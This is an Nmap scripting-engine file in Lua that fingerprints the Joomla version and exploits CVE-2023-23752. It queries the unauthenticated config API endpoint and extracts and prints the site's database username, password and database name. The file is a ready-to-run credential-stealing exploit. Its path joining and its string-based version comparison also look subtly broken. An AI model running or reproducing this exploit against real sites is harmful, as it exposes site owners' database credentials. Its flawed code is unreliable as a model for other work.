local nmap = require "nmap"
local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"

description = [[
This script detects the version of Joomla CMS by analyzing the /language/en-GB/install.xml file. 
It also checks for a specific vulnerability (CVE-2023-23752) that exists in Joomla versions 4.0.0 to 4.2.7.
]]

author = "masta ghimau | https://github.com/gh1mau | https://www.youtube.com/@mastaghimau3881"
categories = {"default", "vuln"}

-- Define the arguments that will be accepted
-- The user can provide a custom Joomla directory path using the --joomla-dir option
-- The default Joomla directory path is "/joomla"
-- Example usage: nmap -p80 --script CVE-2023-23752.nse --script-args joomla-dir=/customdir
-- Note: The custom directory path should start with a forward slash ("/")
-- Example: --script-args joomla-dir=/myjoomladir
-- Do not use spaces in the directory path.
portrule = shortport.http

local joomla_dir = stdnse.get_script_args("joomla-dir") or "/joomla"

function detect_joomla_version(host, port, joomla_dir)
	local options = {
					  header = {
					    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
					    ["Accept"] = "application/json"
					  }
				  }

	local response = http.get(host, port, joomla_dir.."language/en-GB/install.xml", options)
  
  if response.status == 200 then
    local version = response.body:match("<version>([%d%.]+)</version>")
    if version then
      return version
    end
  end
end

local function extract_info(body)
  local user = string.match(body, '"user":"(.-)"')
  local password = string.match(body, '"password":"(.-)"')
  local database = string.match(body, '"db":"(.-)"')
  return user, password, database
end


function check_cve_2023_23752_vuln(host, port, joomla_dir)
	local options = {
					  header = {
					    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
					    ["Accept"] = "application/json"
					  }
				  }

	local response = http.get(host, port, joomla_dir.."language/en-GB/install.xml", options)

  if response.status == 200 then
    local version = response.body:match("<version>([%d%.]+)</version>")
    if version and version >= "4.0.0" and version <= "4.2.7" then
      return true
    end
  end
  return false
end

action = function(host, port)
  local version = detect_joomla_version(host, port, joomla_dir)
  if version then
    local output = string.format("\n[+] Joomla version %s detected on %s:%s", version, host.ip, port.number)
    if check_cve_2023_23752_vuln(host, port, joomla_dir) then
           
     local options = {
					  header = {
					    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
					    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
					    ["Connection"] = "keep-alive"
					  }
				  }

	local response = http.get(host, port, joomla_dir.."api/index.php/v1/config/application?public=true", options)


     
      if response.status == 200 then
        local user, password, database = extract_info(response.body)
        if user and password and database then
          output = output .. "\n[+] Vulnerability exploited successfully!"
          output = output .. string.format("\n[+] User: %s, Password: %s, Database: %s", user, password, database)
        end
      end
      
    end
    return { output = output }
  end
end